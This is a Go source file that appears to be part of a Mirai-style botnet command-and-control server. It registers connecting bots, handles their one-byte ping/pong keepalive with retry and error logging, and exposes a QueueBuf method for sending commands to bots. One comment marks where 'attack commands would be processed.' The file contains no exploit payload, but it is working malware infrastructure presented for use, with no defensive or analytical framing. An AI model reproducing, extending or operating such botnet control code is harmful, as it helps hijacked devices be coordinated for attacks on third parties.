package main

import (
    "fmt"
    "net"
    "time"
)

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 1)  // Changed to 1 byte to match bot protocol
    pingCount := 0
    consecutiveErrors := 0
    maxConsecutiveErrors := 3
    
    for {
        // Increase timeout to 5 minutes
        this.conn.SetDeadline(time.Now().Add(300 * time.Second))
        
        // Read ping from bot (1 byte)
        n, err := this.conn.Read(buf)
        if err != nil {
            consecutiveErrors++
            
            // Handle different types of errors
            if err.Error() == "EOF" {
                fmt.Printf("Bot connection closed by remote (EOF) - Connection: %s (source: %s)\n", this.conn.RemoteAddr(), this.source)
            } else {
                fmt.Printf("Bot ping read failed: %v (bytes: %d) - Connection: %s (source: %s)\n", err, n, this.conn.RemoteAddr(), this.source)
            }
            
            // If we get too many consecutive errors, give up
            if consecutiveErrors >= maxConsecutiveErrors {
                fmt.Printf("Too many consecutive errors (%d), disconnecting bot from %s\n", consecutiveErrors, this.conn.RemoteAddr())
                return
            }
            
            // For EOF errors, don't retry immediately
            if err.Error() == "EOF" {
                return
            }
            
            // For other errors, wait a bit before retrying
            time.Sleep(1 * time.Second)
            continue
        }
        
        // Reset error counter on successful read
        consecutiveErrors = 0
        
        if n != 1 {
            fmt.Printf("Bot ping read incomplete: expected 1 byte, got %d - Connection: %s\n", n, this.conn.RemoteAddr())
            consecutiveErrors++
            if consecutiveErrors >= maxConsecutiveErrors {
                return
            }
            continue
        }
        
        pingCount++
        if pingCount%100 == 0 {  // Log every 100th ping to avoid spam
            fmt.Printf("Bot ping #%d successful from %s (source: %s)\n", pingCount, this.conn.RemoteAddr(), this.source)
        }
        
        // Send pong back to bot (echo the same byte)
        n, err = this.conn.Write(buf)
        if err != nil {
            fmt.Printf("Bot pong write failed: %v (bytes: %d) - Connection: %s\n", err, n, this.conn.RemoteAddr())
            consecutiveErrors++
            if consecutiveErrors >= maxConsecutiveErrors {
                return
            }
            continue
        }
        if n != 1 {
            fmt.Printf("Bot pong write incomplete: expected 1 byte, sent %d - Connection: %s\n", n, this.conn.RemoteAddr())
            consecutiveErrors++
            if consecutiveErrors >= maxConsecutiveErrors {
                return
            }
            continue
        }
        
        // Reset error counter on successful write
        consecutiveErrors = 0
        
        // Optional: Process any commands here
        // This is where attack commands would be processed
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    this.conn.Write(buf)
}
